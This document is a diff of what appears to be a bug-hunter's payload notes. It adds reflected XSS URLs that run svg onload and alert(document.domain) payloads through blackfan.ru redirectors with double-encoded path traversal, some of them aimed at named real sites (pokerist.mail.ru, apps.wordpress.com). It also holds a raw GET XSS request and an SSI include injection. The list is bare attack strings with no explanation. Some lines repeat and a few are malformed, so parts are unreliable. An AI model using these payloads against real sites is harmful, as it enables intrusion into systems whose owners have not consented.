@@ -3,5 +3,24 @@ https://blackfan.ru/x?r=
 
 XSS Code
 https://blackfan.ru/x?r=<URL>/<svg/onload=alert(document.domain)>/%252e%252e'
-http://blackfan.ru/x?r=<URL>/"-alert(document.domain)-"/%252e%252e/games
+https://blackfan.ru/x?r=<URL>/"-alert(document.domain)-"/%252e%252e/games
+https://blackfan.ru/x?r=<URL>/"><svg/onload=alert(document.domain)>/%252e%252e/%252e%252e/
+http://blackfan.ru/x?r=<URL>%252f%253f%2523%22*alert(document.domain)*"
+http://blackfan.ru/x?r=<URL>%252f%253f%2523%22*alert(document.domain)*"
+http://bf.am/x?r=<URL>/"><svg/onload=alert(document.domain)>/%252e%252e/%252e%252e/
+https://blackfan.ru/x?r=<URL>/%22--%3e%3csvg/onload=alert(document.domain)%3e/%252e%252e
+https://blackfan.ru/x?r=<URL>/%22--%3e%3csvg/onload=alert(document.domain)%3e/%252e%252e
+https://blackfan.ru/x?r=<URL>/%22--%3e%3csvg/onload=alert(document.domain)%3e/%252e%252e/
+https://blackfan.ru/x?r<URL>/"--><csvg/onload=alert(document.domain)>/%252e%252e/
+https://blackfan.ru/x?r=<URL>/</script><svg/onload=alert(document.domain)>/%252e%252e/%252e%252e/
+https://pokerist.mail.ru/%3Csvg%20onload=alert(document.domain)%3E
 
+
+GET XSS attack
+GET /"--><svg/onload=alert(document.domain)>/..
+
+Follow Button XSS
+https://apps.wordpress.com/support/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
+
+SSI Injection
+GET //#"--><!--#include file="robots.txt"-->
